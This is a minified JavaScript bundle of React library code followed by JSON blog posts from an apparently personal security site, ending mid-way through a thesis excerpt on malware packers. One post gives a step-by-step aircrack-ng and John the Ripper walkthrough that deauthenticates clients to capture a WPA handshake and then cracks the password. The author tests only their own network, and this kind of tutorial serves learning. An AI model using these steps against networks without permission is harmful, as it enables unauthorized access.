dc(e)},t.hydrate=function(e,t,n){if(!Kc(t))throw Error(r(200));return eu(null,e,t,!0,n)},t.hydrateRoot=function(e,t,n){if(!Jc(e))throw Error(r(405));var a=null!=n&&n.hydratedSources||null,i=!1,o="",s=Xc;if(null!==n&&void 0!==n&&(!0===n.unstable_strictMode&&(i=!0),void 0!==n.identifierPrefix&&(o=n.identifierPrefix),void 0!==n.onRecoverableError&&(s=n.onRecoverableError)),t=Bc(t,null,e,1,null!=n?n:null,i,0,o,s),e[fi]=t.current,qa(e),a)for(e=0;e<a.length;e++)i=(i=(n=a[e])._getVersion)(n._source),null==t.mutableSourceEagerHydrationData?t.mutableSourceEagerHydrationData=[n,i]:t.mutableSourceEagerHydrationData.push(n,i);return new Yc(t)},t.render=function(e,t,n){if(!Kc(t))throw Error(r(200));return eu(null,e,t,!1,n)},t.unmountComponentAtNode=function(e){if(!Kc(e))throw Error(r(40));return!!e._reactRootContainer&&(dc((function(){eu(null,null,e,!1,(function(){e._reactRootContainer=null,e[fi]=null}))})),!0)},t.unstable_batchedUpdates=uc,t.unstable_renderSubtreeIntoContainer=function(e,t,n,a){if(!Kc(n))throw Error(r(200));if(null==e||void 0===e._reactInternals)throw Error(r(38));return eu(e,t,n,!1,a)},t.version="18.2.0-next-9e3b772b8-20220608"},391:(e,t,n)=>{"use strict";var a=n(950);t.createRoot=a.createRoot,t.hydrateRoot=a.hydrateRoot},950:(e,t,n)=>{"use strict";!function e(){if("undefined"!==typeof __REACT_DEVTOOLS_GLOBAL_HOOK__&&"function"===typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE)try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(e)}catch(t){console.error(t)}}(),e.exports=n(730)},153:(e,t,n)=>{"use strict";var a=n(43),i=Symbol.for("react.element"),r=Symbol.for("react.fragment"),o=Object.prototype.hasOwnProperty,s=a.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,l={key:!0,ref:!0,__self:!0,__source:!0};function c(e,t,n){var a,r={},c=null,u=null;for(a in void 0!==n&&(c=""+n),void 0!==t.key&&(c=""+t.key),void 0!==t.ref&&(u=t.ref),t)o.call(t,a)&&!l.hasOwnProperty(a)&&(r[a]=t[a]);if(e&&e.defaultProps)for(a in t=e.defaultProps)void 0===r[a]&&(r[a]=t[a]);return{$$typeof:i,type:e,key:c,ref:u,props:r,_owner:s.current}}t.jsx=c,t.jsxs=c},202:(e,t)=>{"use strict";var n=Symbol.for("react.element"),a=Symbol.for("react.portal"),i=Symbol.for("react.fragment"),r=Symbol.for("react.strict_mode"),o=Symbol.for("react.profiler"),s=Symbol.for("react.provider"),l=Symbol.for("react.context"),c=Symbol.for("react.forward_ref"),u=Symbol.for("react.suspense"),d=Symbol.for("react.memo"),p=Symbol.for("react.lazy"),h=Symbol.iterator;var f={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},m=Object.assign,g={};function y(e,t,n){this.props=e,this.context=t,this.refs=g,this.updater=n||f}function b(){}function w(e,t,n){this.props=e,this.context=t,this.refs=g,this.updater=n||f}y.prototype.isReactComponent={},y.prototype.setState=function(e,t){if("object"!==typeof e&&"function"!==typeof e&&null!=e)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,t,"setState")},y.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")},b.prototype=y.prototype;var v=w.prototype=new b;v.constructor=w,m(v,y.prototype),v.isPureReactComponent=!0;var k=Array.isArray,x=Object.prototype.hasOwnProperty,S={current:null},I={key:!0,ref:!0,__self:!0,__source:!0};function E(e,t,a){var i,r={},o=null,s=null;if(null!=t)for(i in void 0!==t.ref&&(s=t.ref),void 0!==t.key&&(o=""+t.key),t)x.call(t,i)&&!I.hasOwnProperty(i)&&(r[i]=t[i]);var l=arguments.length-2;if(1===l)r.children=a;else if(1<l){for(var c=Array(l),u=0;u<l;u++)c[u]=arguments[u+2];r.children=c}if(e&&e.defaultProps)for(i in l=e.defaultProps)void 0===r[i]&&(r[i]=l[i]);return{$$typeof:n,type:e,key:o,ref:s,props:r,_owner:S.current}}function P(e){return"object"===typeof e&&null!==e&&e.$$typeof===n}var T=/\/+/g;function C(e,t){return"object"===typeof e&&null!==e&&null!=e.key?function(e){var t={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,(function(e){return t[e]}))}(""+e.key):t.toString(36)}function A(e,t,i,r,o){var s=typeof e;"undefined"!==s&&"boolean"!==s||(e=null);var l=!1;if(null===e)l=!0;else switch(s){case"string":case"number":l=!0;break;case"object":switch(e.$$typeof){case n:case a:l=!0}}if(l)return o=o(l=e),e=""===r?"."+C(l,0):r,k(o)?(i="",null!=e&&(i=e.replace(T,"$&/")+"/"),A(o,t,i,"",(function(e){return e}))):null!=o&&(P(o)&&(o=function(e,t){return{$$typeof:n,type:e.type,key:t,ref:e.ref,props:e.props,_owner:e._owner}}(o,i+(!o.key||l&&l.key===o.key?"":(""+o.key).replace(T,"$&/")+"/")+e)),t.push(o)),1;if(l=0,r=""===r?".":r+":",k(e))for(var c=0;c<e.length;c++){var u=r+C(s=e[c],c);l+=A(s,t,i,u,o)}else if(u=function(e){return null===e||"object"!==typeof e?null:"function"===typeof(e=h&&e[h]||e["@@iterator"])?e:null}(e),"function"===typeof u)for(e=u.call(e),c=0;!(s=e.next()).done;)l+=A(s=s.value,t,i,u=r+C(s,c++),o);else if("object"===s)throw t=String(e),Error("Objects are not valid as a React child (found: "+("[object Object]"===t?"object with keys {"+Object.keys(e).join(", ")+"}":t)+"). If you meant to render a collection of children, use an array instead.");return l}function j(e,t,n){if(null==e)return e;var a=[],i=0;return A(e,a,"","",(function(e){return t.call(n,e,i++)})),a}function L(e){if(-1===e._status){var t=e._result;(t=t()).then((function(t){0!==e._status&&-1!==e._status||(e._status=1,e._result=t)}),(function(t){0!==e._status&&-1!==e._status||(e._status=2,e._result=t)})),-1===e._status&&(e._status=0,e._result=t)}if(1===e._status)return e._result.default;throw e._result}var D={current:null},N={transition:null},R={ReactCurrentDispatcher:D,ReactCurrentBatchConfig:N,ReactCurrentOwner:S};t.Children={map:j,forEach:function(e,t,n){j(e,(function(){t.apply(this,arguments)}),n)},count:function(e){var t=0;return j(e,(function(){t++})),t},toArray:function(e){return j(e,(function(e){return e}))||[]},only:function(e){if(!P(e))throw Error("React.Children.only expected to receive a single React element child.");return e}},t.Component=y,t.Fragment=i,t.Profiler=o,t.PureComponent=w,t.StrictMode=r,t.Suspense=u,t.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=R,t.cloneElement=function(e,t,a){if(null===e||void 0===e)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var i=m({},e.props),r=e.key,o=e.ref,s=e._owner;if(null!=t){if(void 0!==t.ref&&(o=t.ref,s=S.current),void 0!==t.key&&(r=""+t.key),e.type&&e.type.defaultProps)var l=e.type.defaultProps;for(c in t)x.call(t,c)&&!I.hasOwnProperty(c)&&(i[c]=void 0===t[c]&&void 0!==l?l[c]:t[c])}var c=arguments.length-2;if(1===c)i.children=a;else if(1<c){l=Array(c);for(var u=0;u<c;u++)l[u]=arguments[u+2];i.children=l}return{$$typeof:n,type:e.type,key:r,ref:o,props:i,_owner:s}},t.createContext=function(e){return(e={$$typeof:l,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null}).Provider={$$typeof:s,_context:e},e.Consumer=e},t.createElement=E,t.createFactory=function(e){var t=E.bind(null,e);return t.type=e,t},t.createRef=function(){return{current:null}},t.forwardRef=function(e){return{$$typeof:c,render:e}},t.isValidElement=P,t.lazy=function(e){return{$$typeof:p,_payload:{_status:-1,_result:e},_init:L}},t.memo=function(e,t){return{$$typeof:d,type:e,compare:void 0===t?null:t}},t.startTransition=function(e){var t=N.transition;N.transition={};try{e()}finally{N.transition=t}},t.unstable_act=function(){throw Error("act(...) is not supported in production builds of React.")},t.useCallback=function(e,t){return D.current.useCallback(e,t)},t.useContext=function(e){return D.current.useContext(e)},t.useDebugValue=function(){},t.useDeferredValue=function(e){return D.current.useDeferredValue(e)},t.useEffect=function(e,t){return D.current.useEffect(e,t)},t.useId=function(){return D.current.useId()},t.useImperativeHandle=function(e,t,n){return D.current.useImperativeHandle(e,t,n)},t.useInsertionEffect=function(e,t){return D.current.useInsertionEffect(e,t)},t.useLayoutEffect=function(e,t){return D.current.useLayoutEffect(e,t)},t.useMemo=function(e,t){return D.current.useMemo(e,t)},t.useReducer=function(e,t,n){return D.current.useReducer(e,t,n)},t.useRef=function(e){return D.current.useRef(e)},t.useState=function(e){return D.current.useState(e)},t.useSyncExternalStore=function(e,t,n){return D.current.useSyncExternalStore(e,t,n)},t.useTransition=function(){return D.current.useTransition()},t.version="18.2.0"},43:(e,t,n)=>{"use strict";e.exports=n(202)},579:(e,t,n)=>{"use strict";e.exports=n(153)},234:(e,t)=>{"use strict";function n(e,t){var n=e.length;e.push(t);e:for(;0<n;){var a=n-1>>>1,i=e[a];if(!(0<r(i,t)))break e;e[a]=t,e[n]=i,n=a}}function a(e){return 0===e.length?null:e[0]}function i(e){if(0===e.length)return null;var t=e[0],n=e.pop();if(n!==t){e[0]=n;e:for(var a=0,i=e.length,o=i>>>1;a<o;){var s=2*(a+1)-1,l=e[s],c=s+1,u=e[c];if(0>r(l,n))c<i&&0>r(u,l)?(e[a]=u,e[c]=n,a=c):(e[a]=l,e[s]=n,a=s);else{if(!(c<i&&0>r(u,n)))break e;e[a]=u,e[c]=n,a=c}}}return t}function r(e,t){var n=e.sortIndex-t.sortIndex;return 0!==n?n:e.id-t.id}if("object"===typeof performance&&"function"===typeof performance.now){var o=performance;t.unstable_now=function(){return o.now()}}else{var s=Date,l=s.now();t.unstable_now=function(){return s.now()-l}}var c=[],u=[],d=1,p=null,h=3,f=!1,m=!1,g=!1,y="function"===typeof setTimeout?setTimeout:null,b="function"===typeof clearTimeout?clearTimeout:null,w="undefined"!==typeof setImmediate?setImmediate:null;function v(e){for(var t=a(u);null!==t;){if(null===t.callback)i(u);else{if(!(t.startTime<=e))break;i(u),t.sortIndex=t.expirationTime,n(c,t)}t=a(u)}}function k(e){if(g=!1,v(e),!m)if(null!==a(c))m=!0,N(x);else{var t=a(u);null!==t&&R(k,t.startTime-e)}}function x(e,n){m=!1,g&&(g=!1,b(P),P=-1),f=!0;var r=h;try{for(v(n),p=a(c);null!==p&&(!(p.expirationTime>n)||e&&!A());){var o=p.callback;if("function"===typeof o){p.callback=null,h=p.priorityLevel;var s=o(p.expirationTime<=n);n=t.unstable_now(),"function"===typeof s?p.callback=s:p===a(c)&&i(c),v(n)}else i(c);p=a(c)}if(null!==p)var l=!0;else{var d=a(u);null!==d&&R(k,d.startTime-n),l=!1}return l}finally{p=null,h=r,f=!1}}"undefined"!==typeof navigator&&void 0!==navigator.scheduling&&void 0!==navigator.scheduling.isInputPending&&navigator.scheduling.isInputPending.bind(navigator.scheduling);var S,I=!1,E=null,P=-1,T=5,C=-1;function A(){return!(t.unstable_now()-C<T)}function j(){if(null!==E){var e=t.unstable_now();C=e;var n=!0;try{n=E(!0,e)}finally{n?S():(I=!1,E=null)}}else I=!1}if("function"===typeof w)S=function(){w(j)};else if("undefined"!==typeof MessageChannel){var L=new MessageChannel,D=L.port2;L.port1.onmessage=j,S=function(){D.postMessage(null)}}else S=function(){y(j,0)};function N(e){E=e,I||(I=!0,S())}function R(e,n){P=y((function(){e(t.unstable_now())}),n)}t.unstable_IdlePriority=5,t.unstable_ImmediatePriority=1,t.unstable_LowPriority=4,t.unstable_NormalPriority=3,t.unstable_Profiling=null,t.unstable_UserBlockingPriority=2,t.unstable_cancelCallback=function(e){e.callback=null},t.unstable_continueExecution=function(){m||f||(m=!0,N(x))},t.unstable_forceFrameRate=function(e){0>e||125<e?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):T=0<e?Math.floor(1e3/e):5},t.unstable_getCurrentPriorityLevel=function(){return h},t.unstable_getFirstCallbackNode=function(){return a(c)},t.unstable_next=function(e){switch(h){case 1:case 2:case 3:var t=3;break;default:t=h}var n=h;h=t;try{return e()}finally{h=n}},t.unstable_pauseExecution=function(){},t.unstable_requestPaint=function(){},t.unstable_runWithPriority=function(e,t){switch(e){case 1:case 2:case 3:case 4:case 5:break;default:e=3}var n=h;h=e;try{return t()}finally{h=n}},t.unstable_scheduleCallback=function(e,i,r){var o=t.unstable_now();switch("object"===typeof r&&null!==r?r="number"===typeof(r=r.delay)&&0<r?o+r:o:r=o,e){case 1:var s=-1;break;case 2:s=250;break;case 5:s=1073741823;break;case 4:s=1e4;break;default:s=5e3}return e={id:d++,callback:i,priorityLevel:e,startTime:r,expirationTime:s=r+s,sortIndex:-1},r>o?(e.sortIndex=r,n(u,e),null===a(c)&&e===a(u)&&(g?(b(P),P=-1):g=!0,R(k,r-o))):(e.sortIndex=s,n(c,e),m||f||(m=!0,N(x))),e},t.unstable_shouldYield=A,t.unstable_wrapCallback=function(e){var t=h;return function(){var n=h;h=t;try{return e.apply(this,arguments)}finally{h=n}}}},853:(e,t,n)=>{"use strict";e.exports=n(234)},24:(e,t,n)=>{var a={"./blogdb":302,"./blogdb/":302,"./blogdb/cybersecurity-in-the-sea":699,"./blogdb/cybersecurity-in-the-sea.json":699,"./blogdb/i-hacked-my-wifi":905,"./blogdb/i-hacked-my-wifi.json":905,"./blogdb/index":302,"./blogdb/index.json":302,"./blogdb/malware-thesis":628,"./blogdb/malware-thesis.json":628,"./blogdb/manual-unpacking-upx-and-mpress":698,"./blogdb/manual-unpacking-upx-and-mpress.json":698,"./blogdb/run-and-debug-dll":880,"./blogdb/run-and-debug-dll.json":880,"./blogdb/test":906,"./blogdb/test.json":906,"./writeupdb":110,"./writeupdb/":110,"./writeupdb/buff":155,"./writeupdb/buff.json":155,"./writeupdb/ignite":456,"./writeupdb/ignite.json":456,"./writeupdb/index":110,"./writeupdb/index.json":110,"./writeupdb/uni-ctf":50,"./writeupdb/uni-ctf.json":50};function i(e){var t=r(e);return n(t)}function r(e){if(!n.o(a,e)){var t=new Error("Cannot find module '"+e+"'");throw t.code="MODULE_NOT_FOUND",t}return a[e]}i.keys=function(){return Object.keys(a)},i.resolve=r,e.exports=i,i.id=24},699:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Cyber Security in the Sea","tags":["security","networking","blockchain"],"date":"27/06/2023","location":"./blog/","banner":"cybersecurityinthesea/banner.webp","type":"blog","search":[{"keyword":"KeyWord1","description":"test search keyword1 in a live search react application"}],"body":[""]}')},905:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"I Hacked My WiFi","tags":["security","networking","wifi","cracking","password","aircrack","debian"],"date":"27/06/2023","location":"./blog/","banner":"ihackedmywifi/banner.webp","type":"blog","search":[{"section":"Introduction","description":"This section introduces the decision to revive an old PC with Debian and test Wi-Fi security by attempting to crack Wi-Fi, highlighting the need for Linux root privileges for network security tasks."},{"section":"Requirements","description":"This section outlines the essential tools for Wi-Fi cracking, including Aircrack-ng for network monitoring and John the Ripper for brute force attacks, explaining their installation on Debian and Kali Linux."},{"section":"Find wireless interface name","description":"This part covers how to identify the wireless interface name using commands like `iwconfig` and alternatives, ensuring proper network setup before Wi-Fi cracking."},{"section":"Kill interfering processes","description":"This section explains the importance of stopping interfering processes using `airmon-ng check kill` before enabling monitor mode for effective Wi-Fi traffic monitoring."},{"section":"Enable monitor mode","description":"Describes how to enable monitor mode with `airmon-ng start`, allowing the wireless interface to capture all traffic on a specific channel, crucial for network packet analysis."},{"section":"Discover access point","description":"This section details discovering nearby access points and capturing wireless packets with `airodump-ng`, essential for gathering data from target networks."},{"section":"Save data to file","description":"Explains saving captured wireless data to files using `airodump-ng -w`, setting up files for later analysis and decryption attempts."},{"section":"Deauthentication","description":"Discusses the use of `aireplay-ng \u2013deauth` to disconnect devices, forcing them to reconnect and send a hashed password, which is crucial for capturing the WPA handshake."},{"section":"Crack the password","description":"This final section explores password-cracking methods, including dictionary attacks with `aircrack-ng` and brute force using John the Ripper, detailing file conversion steps to make captured data compatible with cracking tools."}],"body":[{"id":"I Hacked My WiFi","title":"<h1> <span style=\\"color:#da1953\\">I Ha</span>cked My WiFi</h1><hr>","body":[{"id":"banner","title":"banner","body":["<img src=\\"/cyber/ihackedmywifi/banner.webp\\" alt=\\"\\"><hr>"]},{"id":"Introduction","title":"<hr><h2> <span style=\\"color:#da1953\\">Int</span>roduction</h2>","body":["<p> Recently I decided to bring my 9 years old pc back to life. I opted for Debian as the operating system due to the very minimal system specifications, and therefore perfect for my case. After a painstakingly long time taken for the installation of Debian, I decided to try to crack my WI-FI just to tinker maybe due to a little bit of nostalgia, and a little just to test my Wi-Fi security, (Note all commands launched from now on need root privileges. To get the privileges just type su \u2013 and enter the password to become root.)</p>"]},{"id":"Requierements","title":"<h2 id=\\"REQ\\"> <span style=\\"color:#da1953\\">Req</span>uirements </h2>","body":["<p>I need to install Aircrack-ng to perform the attack and JTR (John The Ripper) to perform brute force cracking, unless I am in Kali Linux I will install by typing apt install aircrack-ng and for JTR I suggest using the one installed on Kali Linux that works out of the box.</p>"]},{"id":"Find wireless interface name","title":"<h2> <span style=\\"color:#da1953\\">Fin</span>d wireless interface name </h2>","body":["<p>To find the name of the wireless interface I run <code>iwconfig</code>.</p>","<p><img src=\\"/cyber/ihackedmywifi/iwconfig.png\\" alt=\\"iwconfig\\"></p>","<p>but any other commands for networking will work fine, such as <code>ifconfig</code> (which is deprecated now use <code>ip address</code> / <code>ip add</code> / <code>ip a</code>).</p>","<p><img src=\\"/cyber/ihackedmywifi/ipa.png\\" alt=\\"ip a\\"></p>","<p>I do not know why but, in my case, I have a very strange name (wlp2s0b1) I would have expected to see something like wlan0.</p>"]},{"id":"Kill interfering processes","title":"<h2> <span style=\\"color:#da1953\\">Kil</span>l interfering processes </h2>","body":["<p>Before enabling monitor mode, we need to kill interfering processes.</p>","<p>To check which process might interfere run <code>airmon-ng check</code>.</p>","<p><img src=\\"/cyber/ihackedmywifi/check.png\\" alt=\\"airmon-ng check\\"></p>","<p>To kill the interfering processes run <code>airmon-ng check kill</code> or kill them manually.</p>","<img src=\\"/cyber/ihackedmywifi/checkkill.png\\" alt=\\"airmon-ng check kill\\">"]},{"id":"Enable monitor mode","title":"<h2> <span style=\\"color:#da1953\\">Ena</span>ble monitor mode </h2>","body":["<p>Monitor mode allows a computer with a wireless network interface controller to monitor all traffic received on a given wireless channel.</p>","<p>To enable monitor mode type <code>airmon-ng start wlp2s0b1</code>.</p>","<p><img src=\\"/cyber/ihackedmywifi/startwlan0.png\\" alt=\\"start wlan\\"></p>","<p>Now a new name has been assigned to the interface (wlp2s0b1mon) and from now on I will use that.</p>"]},{"id":"Discover access point","title":"<h2> <span style=\\"color:#da1953\\">Dis</span>cover Access Point </h2>","body":["<p>To discover surrounding access point type <code>airodump-ng wlp2s0b1mon</code>.</p>","<p><img src=\\"/cyber/ihackedmywifi/airodumpvlan0.png\\" alt=\\"airodump vlan\\"></p>","<p>Now we will start to catch all the wireless packets and gather data from the networks.</p>","<p>From this step onward we need to remember the victim (me) Wi-Fi channel, in my case is 1.</p>","<p><span style=\\"color:#FFC107\\">This terminal must never be closed as it will be used to find out if we have successfully established the 4-way handshake which contains the password hash for authentication.</span></p>","<p><span style=\\"color:#FFC107\\">The next step will be done in another window.</span></p>"]},{"id":"Save data to file","title":"<h2> <span style=\\"color:#da1953\\">Sav</span>e data to file </h2>","body":["<p>To save data in files we need to use the same command we use in step 4 with a different option.</p>","<p><code>airodump-ng -c [channel] \u2013bssid [bssid of victim wifi] -w [path to write files] wlp2s0b1mon[interface]</code></p>","<p><img src=\\"/cyber/ihackedmywifi/savefilecap.png\\" alt=\\"save file\\"></p>","<p>The result of the command will be something like this.</p>","<p><img src=\\"/cyber/ihackedmywifi/safilecap1.png\\" alt=\\"save file\\"></p>","<p>And it will also create files on the given path (in my case the current directory).</p>","<p><img src=\\"/cyber/ihackedmywifi/savefilecap2.png\\" alt=\\"save file\\"></p>","<p><span style=\\"color:#FFC107\\">Same as for step 4 I leave the window open and the next operations will be done in a further third window.</span></p>"]},{"id":"Deauthentication","title":"<h2> <span style=\\"color:#da1953\\">Dea</span>uthentication </h2>","body":["<p>The goal of this phase is to disconnect all the devices connected to the Wi-Fi so that when they reconnect, they will send the password under the hash signature to the router and then we can capture it to crack it.</p>","<p>The channel used is the same as the previous one where the victim is (1).</p>","<p>To do so the command is <code>aireplay-ng \u2013deauth 1 -a [victim BSSID] wlp2s0b1mon</code>.</p>","<p><img src=\\"/cyber/ihackedmywifi/deauth1.png\\" alt=\\"deauthentication\\"></p>","<p>It will establish the handshake alongside the hash of the password and the same in the file previously set.</p>","<p>On my first try even if everything went well for some reason Aircrack-ng didn\u2019t find the handshake in the .cap file so just to be sure I tend to repeat this step a few times.</p>","<p>If we correctly establish the handshake, I will see it in the window where I executed<br><code>airodump-ng -c [channel] \u2013bssid [bssid of victim wifi] -w [path to write files] wlp2s0b1mon[interface]</code></p>","<p><img src=\\"/cyber/ihackedmywifi/checkhandshake.png\\" alt=\\"check handshake\\"></p>","<p>Sometimes you might get a message where the network interface and the victim\u2019s Wi-Fi are in different channels, don\u2019t panic just run the command again and again until you get it!</p>","<p><img src=\\"/cyber/ihackedmywifi/differentchannels.png\\" alt=\\"channel\\"></p>","<p>You might never get the handshake containing the hash if no devices are connected! Don\u2019t lose your hope. In this case, you need to wait until someone comes and hopefully connects to the Wi-Fi.</p>"]},{"id":"Crack the password","title":"<h2> <span style=\\"color:#da1953\\">Ste</span>p 7: Crack the password </h2>","body":["<p>There are a few methods to crack the password the first method I tried is the dictionary attack, to perform it execute<br><code>aircrack-ng -b [victim BSSID] -w [wordlistpath] [path to .cap file]</code></p>","<p>I created a tiny wordlist containing my password for testing purposes, in a real world-scenario, I would use good wordlists, not necessarily big but good and more than one probably.</p>","<p>The .cap file is automatically created on a given path to save the files in step 5.</p>","<p><img src=\\"/cyber/ihackedmywifi/cracked.png\\" alt=\\"cracked\\"></p>","<p>What if the password is not in the wordlist? I have to try different types of attacks like brute force.</p>","<p>To do the brute force attack I moved to my Kali Linux because it has JTR (John The Ripper) installed properly, which is my favourite cracking program, and with all its features which include the cracking of wpa keys.</p>","<p>To let JTR to be able to crack a WPA handshake I need to convert the .pcap file to a proper format, the first thing is to convert the pcap file into a .hccap file, to do so we will use aircrack-ng: <code>aircrack-ng [.pcap file] -J [filename]</code></p>","<p><img src=\\"/cyber/ihackedmywifi/pcap2hccap.jpg\\" alt=\\"pcap2hhcap\\"></p>","<p>Now I will convert the .hccap file into a a file that JTR can understand and crack:<br><code>hccap2john [.hccap file] &gt; [filename]</code></p>","<p>At this point, we can use any mode JTR has to crack the password:<br><code>john [optional mode] [file]</code></p>","<p><img src=\\"/cyber/ihackedmywifi/jtr.jpg\\" alt=\\"john the ripper\\"></p>","<p>To see all the modes avalaible I suggesto to look the manual of JTR.</p>"]}]}]}')},302:e=>{"use strict";e.exports=JSON.parse('{"files":["blogdb/malware-thesis.json","blogdb/manual-unpacking-upx-and-mpress.json","blogdb/run-and-debug-dll.json","blogdb/i-hacked-my-wifi.json"],"disabled":["blogdb/test.json"],"next":["blogdb/cybersecurity-in-the-sea"]}')},628:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"A Review of Common Practices for Malware Unpacking","tags":["security","networking","reverse engineering","pestudio","ida","detectiteasy","vmware","scylla","upx","mpress","malware packing","unpacking","iot","iat"],"date":"27/06/2023","banner":"thesis/banner.webp","location":"./blog/","type":"blog","search":[{"section":"KeyWord1","description":"No description yet."}],"body":[{"id":"A Review of Common Practices for Malware Unpacking","title":"<h1><span style=\\"color:#da1953\\">A Re</span>view of Common Practices for Malware Unpacking<hr></h1><br>","body":[{"id":"banner","title":"banner","body":["<img src=\\"/cyber/thesis/banner.webp\\" alt=\\"\\"><hr>"]},{"id":"1. Abstract","title":"<hr><h2><span style=\\"color:#da1953\\">1. Ab</span>stract</h2>","body":["<p>In today\u2019s digital world software security is a very important aspect and plays a vital role in protecting people, information and intellectual properties from malicious users. However, malicious users develop day by day more sophisticated strategies to achieve their goals by exploiting from old to newly discovered vulnerabilities and targeting the weakest chain of the cyber security, the human.</p>","<p>With more sophisticated attacks the protection mechanism to detect and respond to these attacks also becomes sophisticated. Due to this reason malicious attackers implements protection layers in particular to malware attacks in order to evade detection and analysis. To such purpose packer software is the perfect solution.</p>","<p>The study of packers and their impact on software security and cyber-attacks is crucial for understanding the techniques employed by both malicious actors and legitimate software developers. This thesis aims to provide an exploration of packers, including their mechanisms, functionality, and implications for software analysis.</p>","<p>The primary objective of this thesis is to analyze and evaluate different packer techniques, dissecting their inner workings and investigating the challenges they pose to traditional security analysis approaches. By examining various packers\' features, we seek to increase our understanding of their strengths, weaknesses, and potential mitigations. Furthermore, this thesis aims to propose a possible strategy to analyze advanced packers by exploring innovative approaches.</p>","<p>The chapter 2 and 3 introduce the concept of packers and their basic functionalities, their inner work, and different types of packers. These chapters explain the purpose of packing how they were born and how they were used differently from their initial purpose for malicious intents.</p>","<p>Chater 3 and 4 goes deep down on analyzing these packers understanding different approaches and strategies, their advantages, and disadvantages, and how they can be combined to have a more complete understanding of if the packed malware. I particularly the chapter 5 give guidance on how to set up a possible virtual environment for analyzing such malware. Furthermore, it describes how to identify if an executable is packed and hides malicious payload inside by analyzing various packing indicator. Lastly, it shows step by step how to unpack a simpler version UPX and MPRESS packers for a demonstration purpose and how to extract the packed code.</p>","<p>Chapter 6 is focus on an advanced technique to identify packers, as they can implement techniques to hide indication from packer analysis tools. This chapter explains what feature to extract and how to analyze them in order to identify packer indications.</p>","<p>Chapter 7 and 9 introduce advanced packers, their behaviour and evasion techniques. The analysis of these packers is not trivial, and they are time consuming. This chapter describes the techniques employed by the packer to evade analysis by malware analyst. Complex packers described in the chapter that implement such advanced evasion techniques are Themida and PEzoNG.</p>","<p>Chapter 8 and 9 propose a solution for advanced packers implementing diverse evasion techniques making analyzing them time consuming and hard. The chapters propose an execution path strategy in order to execute all the branches and a signature-based technique to detect pattern a logic flow to build a database of signature for future detection.</p>","<p>The chapter 10 studies the possibility to perform packing and unpacking on embedded systems and IoT. As they have a very limited computational powers executing advanced evasion technique may not be possible to implement. The chapter also studies the performance of UPX and RSA packing on such systems.</p>","<p>In conclusion, this thesis aims to enlighten the complex world of packers, providing valuable insights into their workings, their impact on software security, and potential countermeasures. By reducing the gap between packer technologies and security analysis, we strive to give a good understanding of their potential and utilization.</p>"]},{"id":"2 Introduction","title":"<h2> <span style=\\"color:#da1953\\">2.1 Int</span>roduction to packers </h2>","body":[{"title":"<h3>2.1 Packing purpose </h3>","id":"2.1 Packing purpose","body":["<p>Packing is a technique that is widely used to compress software to reduce in size, often it improves performance, protects intellectual properties, and prevents tamper. One of the main purposes of packing software is to reduce the size which makes the distribution and the download of the executable faster compared to its original size, especially for big software. This is really useful, for software distributed over the internet, which makes it convenient for users.</p>","<p>Another benefit of packing is to protect intellectual properties by hindering third parties from reverse engineering and decompiling the code. This can prevent competitors from stealing the code or creating a similar product. Various techniques of packing can be implemented in order to protect the software.</P>","<p>Malicious users use the packing technique to avoid detection mechanisms by detection software such as Firewalls and Intrusion Detections Systems (IDS) by compressing or encrypting the malicious code. This makes it difficult to be detected by the protection mechanisms.</p>","<p>As further protection packers can implement anti-debugging and anti-tampering techniques on the malware. Malware packed in such mechanisms makes really difficult to be analyzed. Anti-debugging technique detects and tries to prevent debugging attempts by checking for example breakpoint which is a clear indication of debugging. Anti-tampering mechanisms on the other hand tried to detect changes in the code and a possible way can be by computing checksums and digital signatures. If the mentioned actions are detected by the malware, it may terminate or alter its behavior as a protection mechanism to mislead malware analysts.</p>","<p>Finally, the main purpose of malware packers is to increase the chances of successfully infecting a target system, avoiding detection by security measures, making the malware hard to analyze in order to understand how internally it works and mitigate any infection.</p>"]},{"id":"2.2 How packers work","title":"<h3>2.2 How packers work</h3>","body":["<p>During the packing process, the packing software takes as input the original executable file (PE) and generated a new packed file.  During the packing process, the packer can encrypt or compress the original PE file or a combination of both. This newly packed file contains the original PE file and the code to unpack it during the execution usually called \u201cstub\u201d which is the new entry point of the executable. The stub is usually designated to unencrypt or decompress the original PE but, in some cases, it can also encrypt and compress back the code.</p>","<p>The following image shows an example of how the executable file changes before and after the packing process:</p>","<p><img src=\\"/cyber/thesis/1.png\\" alt=\\"PE vs Packed PE\\"></p>","<p>The newly packed PE file has a different structure than the original PE, trying to analyze this file will result in an unsuccessful attempt as the real code is not extracted yet.</p>","<p>The packer can modify the PE header or remove it completely in an attempt to evade detections by security systems or malware analysts. The packer can also add some additional code as anti-debugging and anti-tampering technique. When the packed PE is executed the first entry point is the stub which extracts the packed code to be unpacked. Once the extractions finishes, the control is passed to the unpacked code to be executed. The following image shows the steps involved during this process:</p>","<p><img src=\\"/cyber/thesis/2.png\\" alt=\\"\\"></p>","<p>Understanding how the packing process works and how the PE section can be modified is as important as to keep the system up to date, use strong passwords, and avoid getting files from untrusted sources to avoid getting infected.</p>","<p>The structure of a packed PE file is complex as it is usually customized by malware writers to obfuscate the malicious code. During the analysis of a packer the main objective is to find the Original Entry Point (OEP), which is the starting point of the original malicious code. Identifying the OEP is not always trivial as malware authors can implement techniques to make this step difficult.</p>","<p>Overall, the process of packing malware is constantly evolving, and malware authors are continually developing new techniques to evade detection. As security researchers, it\'s crucial to keep up with the latest malware-packing methods to detect and prevent.</p>"]}]},{"id":"3 Standard packer vs runtime 